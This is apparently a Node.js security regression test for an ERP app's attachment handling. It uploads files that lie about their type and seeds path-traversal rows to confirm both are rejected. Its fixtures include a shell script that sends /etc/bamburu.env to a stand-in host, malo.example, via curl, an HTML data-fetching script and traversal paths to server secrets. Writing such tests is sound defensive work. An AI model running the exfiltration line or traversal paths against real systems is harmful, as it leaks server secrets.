#!/usr/bin/env node
//
// gate-adjuntos-por-contenido.mjs — AUD-011 + AUD-012: un adjunto es lo que SUS BYTES dicen, y su
// ruta no sale de la carpeta de adjuntos.
//
// QUÉ MIDE, Y POR QUÉ ASÍ. No comprueba «que el código diga»: sube ficheros DE VERDAD por las rutas
// DE VERDAD del servidor vivo, con una sesión de administrador real, y mira lo que contesta. Los dos
// agujeros que cierra existían los dos:
//
//   AUD-011 · `saveAttachment` decidía la extensión con `ALLOWED_MIME[mime]`, y ese `mime` lo manda
//            el navegador. Un ejecutable llamado `factura.png` llega con `type: image/png` porque el
//            navegador dice lo que le pidan: entraba, se guardaba con extensión de imagen, y se
//            servía después con `Content-Type: image/png` — el mime declarado era también el que
//            salía por la puerta.
//   AUD-012 · `readAttachmentBuffer` hacía `isAbsolute(att.path) ? att.path : …`. Una ruta absoluta
//            en la base se leía TAL CUAL, sin mirar dónde apuntaba. La carpeta de adjuntos no era
//            una frontera: era una costumbre.
//
// LOS CUATRO CRITERIOS DE LA FICHA, uno a uno:
//   1. El tipo se decide mirando el contenido → bloque [2]: lo que se guarda es el mime MEDIDO.
//   2. Un fichero cuyo contenido no coincide con lo que dice ser se rechaza → bloque [2].
//   3. La ruta nunca sale de la carpeta de adjuntos, aunque en la base haya una absoluta → bloque [3].
//   4. Hay una comprobación que intenta las dos cosas y demuestra que fallan → este fichero.
//
// EL CONTROL EN VERDE DEL BLOQUE [1] NO ES DECORACIÓN: sin él, un producto con la subida rota daría
// todos los rechazos por buenos y este gate sería verde sobre un cadáver.
//
//   node scripts/gate-adjuntos-por-contenido.mjs
import Database from 'better-sqlite3';
import { randomBytes } from 'crypto';
import { existsSync, unlinkSync, readFileSync } from 'fs';
import { join } from 'path';
import { tenantDb, APP_DIR } from './lib/gate-env.mjs';
import { rutaDeAdjunto, mimeReal, raizAdjuntos } from '../modules/erp/attachments.js';

process.chdir(APP_DIR);   // la carpeta de adjuntos se resuelve contra el cwd, igual que en el servidor

const SLUG = 'desarrollo-bamburu';
const BASE = 'http://' + SLUG + '.localhost:3000';
const RID = randomBytes(4).toString('hex');
const MARCA = 'GATE ADJ ' + RID;

let pass = 0, fail = 0;
const ok = (c, m, det) => {
  if (c) { pass++; console.log('  ✓ ' + m + (det ? ' · ' + det : '')); }
  else { fail++; console.error('  ✗ FALLO: ' + m + (det ? ' · ' + det : '')); }
};

const db = new Database(tenantDb(SLUG));

// ── Ficheros de verdad, de cada clase ────────────────────────────────────────────────────────────
// El PNG es un PNG válido entero (1×1 transparente), no una cabecera suelta: si el control en verde
// se apoyara en un fichero a medias, no probaría que el producto funciona.
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=',
  'base64');
const PDF = Buffer.from('%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n');
const ELF = Buffer.concat([Buffer.from('7f454c460201010000000000000000', 'hex'), Buffer.alloc(64, 0x41)]);
const SH  = Buffer.from('#!/bin/sh\ncurl http://malo.example/$(cat /etc/bamburu.env | base64)\n');
const HTM = Buffer.from('<html><script>fetch("/api/erp/clients").then(r=>r.text())</script></html>');

let sesion = null, csrf = null, fotoPrevia = null, fotoLeida = false;
const creados = [];   // ids de attachments sembrados a mano, para la limpieza

const subir = async (ruta, campo, buf, mime, nombre) => {
  const fd = new FormData();
  fd.append(campo, new Blob([buf], { type: mime }), nombre);
  const r = await fetch(BASE + ruta, {
    method: 'POST',
    headers: { Cookie: 'asess=' + sesion, 'x-csrf-token': csrf },
    body: fd,
  });
  let cuerpo = {};
  try { cuerpo = await r.json(); } catch { /* no siempre es json */ }
  return { status: r.status, cuerpo };
};

const pedir = async (ruta) => {
  const r = await fetch(BASE + ruta, { headers: { Cookie: 'asess=' + sesion } });
  return { status: r.status, buf: Buffer.from(await r.arrayBuffer()) };
};

// Siembra una fila de adjunto con la ruta que se le diga. Es EXACTAMENTE la situación de AUD-012:
// una ruta tramposa YA metida en la base. No hace falta saber cómo llegó ahí — la defensa tiene que
// aguantar que esté.
// Un trozo RECONOCIBLE del fichero que se está intentando robar, para poder afirmar sobre el
// contenido y no sobre el código de estado. Si no se puede leer desde aquí (permisos), devuelve
// null y la comprobación lo dice en voz alta en vez de fingir que midió algo.
//
// ESTE TROZO NO SE IMPRIME JAMÁS, y no es una precaución teórica: uno de los ficheros atacados es
// `/etc/bamburu.env`. La primera versión de este gate lo sacaba por pantalla para «explicar qué
// buscaba», y lo que hizo fue enseñar el principio de una clave de API en la salida de una prueba.
// Se compara y se olvida; a la pantalla solo va cuántos bytes se buscaron.
// SE COMPARA EN CRUDO, BYTE A BYTE. La primera versión normalizaba los espacios del patrón
// (`replace(/\s+/g,' ')`) y NO los de la respuesta, así que buscaba algo que no podía aparecer: en
// la prueba en rojo, con `package.json` y `control.db` servidos ENTEROS y con HTTP 200, estas tres
// líneas siguieron en VERDE. Un patrón que no puede casar nunca es un verde que no significa nada.
function leerTrozo(ruta) {
  const abs = ruta.startsWith('/') ? ruta : join(APP_DIR, ruta);
  try {
    const b = readFileSync(abs);
    return b.length >= 16 ? b.subarray(0, 40) : null;
  } catch { return null; }
}

const sembrarRuta = (ruta, kind = 'user_photo') => {
  const r = db.prepare(
    'INSERT INTO attachments (kind, original_name, path, mime, size) VALUES (?,?,?,?,?)'
  ).run(kind, MARCA, ruta, 'image/png', 0);
  creados.push(r.lastInsertRowid);
  return r.lastInsertRowid;
};

try {
  // Sesión real de administrador (usuario 2, como el resto de gates C2).
  const now = Math.floor(Date.now() / 1000);
  sesion = randomBytes(32).toString('base64url');
  csrf = randomBytes(32).toString('base64url');
  db.prepare('INSERT INTO admin_sessions (token,user_id,created_at,expires_at,csrf_token) VALUES (?,?,?,?,?)')
    .run(sesion, 2, now, now + 1800, csrf);
  fotoPrevia = db.prepare('SELECT foto_url FROM admin_users WHERE id=2').get()?.foto_url ?? null;
  fotoLeida = true;   // `null` es un valor legítimo ("no tenía foto"): hace falta un testigo aparte

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  console.log('\n[1] CONTROL EN VERDE — lo bueno sigue entrando (si no, todo lo demás es verde de mentira)');
  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  const buena = await subir('/api/erp/perfil/foto', 'foto', PNG, 'image/png', 'retrato.png');
  ok(buena.status === 200, 'un PNG de verdad, declarado PNG, se sube sin problemas', 'HTTP ' + buena.status);
  const idBueno = Number((buena.cuerpo.foto_url || '').split('/').pop());
  ok(Number.isFinite(idBueno) && idBueno > 0, '  y queda guardado con su id', 'id ' + idBueno);
  if (idBueno) creados.push(idBueno);

  const vuelta = await pedir('/api/erp/perfil/foto/' + idBueno);
  ok(vuelta.status === 200, '  y se sirve de vuelta', 'HTTP ' + vuelta.status);
  ok(vuelta.buf.equals(PNG), '  byte a byte igual al que se subió', vuelta.buf.length + ' bytes');

  const filaBuena = db.prepare('SELECT * FROM attachments WHERE id=?').get(idBueno) || {};
  ok(filaBuena.path && !filaBuena.path.includes('..') && filaBuena.path.startsWith('data/uploads/'),
     '  con una ruta dentro de la carpeta de adjuntos', filaBuena.path);
  ok((filaBuena.path || '').endsWith('.png'), '  y extensión .png, sacada de sus bytes');

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  console.log('\n[2] ATAQUE 1 — un fichero que MIENTE sobre lo que es');
  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  const antes = db.prepare('SELECT COUNT(*) n FROM attachments').get().n;

  const mentiras = [
    ['un ejecutable (ELF) disfrazado de PNG', ELF, 'image/png', 'factura.png'],
    ['un script de shell disfrazado de JPG', SH, 'image/jpeg', 'nomina.jpg'],
    ['una página con <script> disfrazada de PNG', HTM, 'image/png', 'ticket.png'],
    ['un PDF DE VERDAD que dice ser PNG', PDF, 'image/png', 'albaran.png'],
  ];
  for (const [que, buf, mime, nombre] of mentiras) {
    const r = await subir('/api/erp/perfil/foto', 'foto', buf, mime, nombre);
    ok(r.status === 400, que + ' → RECHAZADO', 'HTTP ' + r.status);
    ok(/no es una imagen|dice ser/i.test(r.cuerpo.error || ''),
       '  y se le dice al usuario qué pasa, sin tecnicismos', (r.cuerpo.error || '').slice(0, 62));
  }
  // El PDF-que-dice-ser-PNG es el caso fino: los DOS tipos están permitidos. Lo que se rechaza no es
  // el tipo, es la MENTIRA — y por eso el mensaje tiene que nombrar los dos.
  const finoR = await subir('/api/erp/perfil/foto', 'foto', PDF, 'image/png', 'x.png');
  ok(/image\/png/.test(finoR.cuerpo.error || '') && /application\/pdf/.test(finoR.cuerpo.error || ''),
     'el mensaje dice lo que decía ser Y lo que era', (finoR.cuerpo.error || '').slice(0, 70));

  // La otra puerta, la de compras: mismo ataque, mismo rechazo. Y se corta ANTES de llamar al modelo
  // de visión, así que no cuesta ni un céntimo ni depende de la cuota de IA del negocio.
  const compras = await subir('/api/erp/purchases/capture', 'file', ELF, 'application/pdf', 'proveedor.pdf');
  ok(compras.status === 400, 'por la puerta de compras, el mismo disfraz → RECHAZADO', 'HTTP ' + compras.status);

  // UN RECHAZO QUE GUARDA EL FICHERO IGUAL NO ES UN RECHAZO.
  const despues = db.prepare('SELECT COUNT(*) n FROM attachments').get().n;
  ok(despues === antes, 'ninguno de los seis intentos dejó fila en la base', antes + ' → ' + despues);

  const fotoAhora = db.prepare('SELECT foto_url FROM admin_users WHERE id=2').get()?.foto_url ?? null;
  ok(fotoAhora === '/api/erp/perfil/foto/' + idBueno, '  ni cambió la foto del usuario por una falsa');

  // Y el mime que se GUARDA es el medido, no el declarado: es el que sale por `Content-Type` al
  // servir, así que un mime mentiroso en la base es un mime mentiroso en la respuesta.
  ok(filaBuena.mime === 'image/png' && mimeReal(PNG) === 'image/png',
     'lo que se guarda como tipo es lo MEDIDO en los bytes', filaBuena.mime);

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  console.log('\n[3] ATAQUE 2 — una ruta que se sale de la carpeta de adjuntos');
  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // Los saltos se cuentan DESDE la carpeta del negocio hasta la raíz del sistema, no a ojo: la
  // primera versión de este gate escribió `../../../../etc/hostname` a mano y se quedaba en
  // `/home/etc/hostname`, que no existe. Atacaba al vacío, y el vacío siempre se defiende solo.
  const hastaRaiz = '../'.repeat(join(APP_DIR, 'data', 'uploads', SLUG).split('/').length - 1);
  const fuera = [
    ['una ruta ABSOLUTA a un fichero del repo', join(APP_DIR, 'package.json')],
    ['una ruta ABSOLUTA a los secretos del servidor', '/etc/bamburu.env'],
    ['saltos hacia arriba desde la carpeta buena', 'data/uploads/' + SLUG + '/../../../package.json'],
    ['saltos hasta la raíz del sistema', 'data/uploads/' + SLUG + '/' + hastaRaiz + 'etc/hostname'],
    ['la BD que enruta TODOS los negocios', 'data/uploads/' + SLUG + '/../../control.db'],
  ];
  for (const [que, ruta] of fuera) {
    // SIN ESTO, EL BLOQUE ENTERO PODRÍA SER VERDE SOBRE NADA: si el fichero que se intenta robar no
    // existe, que no se sirva no demuestra que la frontera funcione.
    const objetivo = ruta.startsWith('/') ? ruta : join(APP_DIR, ruta);
    ok(existsSync(objetivo), que + ' → el objetivo EXISTE (si no, no se estaría atacando nada)');
    const id = sembrarRuta(ruta);
    const r = await pedir('/api/erp/perfil/foto/' + id);
    ok(r.status !== 200, que + ' → NO SE SIRVE', 'HTTP ' + r.status);
    // NO BASTA CON QUE EL ESTADO NO SEA 200: eso lo mira la línea de arriba y se cumpliría igual
    // aunque el fichero viajara en el cuerpo. Aquí se lee el fichero atacado DE VERDAD y se exige
    // que ni un trozo suyo aparezca en lo que contestó el servidor.
    const trozo = leerTrozo(ruta);
    ok(trozo === null || !r.buf.includes(trozo),
       '  y en la respuesta no aparece NADA del fichero atacado',
       trozo === null ? '⚠️  ilegible desde aquí: esta línea NO mide nada'
                      : 'buscados ' + trozo.length + ' bytes suyos');
    ok(rutaDeAdjunto({ path: ruta }) === null, '  la ruta se declara fuera de la frontera');
  }

  // Y NO ES QUE LO BLOQUEE TODO. Un guardián que dice «no» a todo también da verde en las cinco de
  // arriba, y sería otro falso verde: se comprueba que una ruta legítima sí pasa.
  ok(rutaDeAdjunto(filaBuena) !== null, 'una ruta legítima SÍ pasa la frontera', filaBuena.path);
  ok((rutaDeAdjunto(filaBuena) || '').startsWith(raizAdjuntos()), '  y lo resuelto cuelga de data/uploads/');

  // La forma no importa, importa DÓNDE ACABA: una ruta absoluta que apunta DENTRO de la carpeta es
  // legítima, y una relativa que sale, no. La comprobación es de resultado.
  ok(rutaDeAdjunto({ path: join(raizAdjuntos(), SLUG, 'loquesea.png') }) !== null,
     'una ruta absoluta que apunta DENTRO sí vale: se juzga el destino, no la forma');

  // El caso que hacía de esto un agujero de verdad: leer un secreto del servidor.
  const idSecreto = sembrarRuta('/etc/bamburu.env');
  const secreto = await pedir('/api/erp/perfil/foto/' + idSecreto);
  ok(secreto.status !== 200 && !/TELEGRAM|RESEND|STRIPE|sk-/.test(secreto.buf.toString('latin1')),
     'con la ruta de los secretos en la base, no sale NADA de /etc/bamburu.env', 'HTTP ' + secreto.status);

} catch (e) {
  fail++;
  console.error('  ✗ EXCEPCIÓN: ' + (e?.stack || e?.message || e));
} finally {
  // LO QUE LA PRUEBA CREA, LA PRUEBA LO BORRA — y por la MARCA, no por los ids de esta pasada, para
  // que se limpie igual si el gate muere a mitad.
  try {
    for (const fila of db.prepare('SELECT id, path FROM attachments WHERE original_name=?').all(MARCA)) {
      db.prepare('DELETE FROM attachments WHERE id=?').run(fila.id);
    }
    for (const id of creados) {
      const f = db.prepare('SELECT path FROM attachments WHERE id=?').get(id);
      if (f && f.path && f.path.startsWith('data/uploads/')) {
        const abs = join(APP_DIR, f.path);
        if (existsSync(abs)) unlinkSync(abs);
      }
      db.prepare('DELETE FROM attachments WHERE id=?').run(id);
    }
      // OJO: se restaura si se LEYÓ, no si «hay valor». La primera versión ponía
    // `if (fotoPrevia !== null)`, y a un usuario sin foto le dejó puesta la de la prueba —
    // apuntando además a un adjunto que la propia limpieza acababa de borrar.
    if (fotoLeida) db.prepare('UPDATE admin_users SET foto_url=? WHERE id=2').run(fotoPrevia);
    if (sesion) db.prepare('DELETE FROM admin_sessions WHERE token=?').run(sesion);
  } catch (e) { console.error('  ⚠️  limpieza incompleta: ' + (e?.message || e)); }
  try { db.close(); } catch { /* ya estaba cerrada */ }
}

console.log('\n═════════ RESULTADO: ' + pass + ' ✓ · ' + fail + ' ✗ ═════════');
process.exit(fail ? 1 : 0);
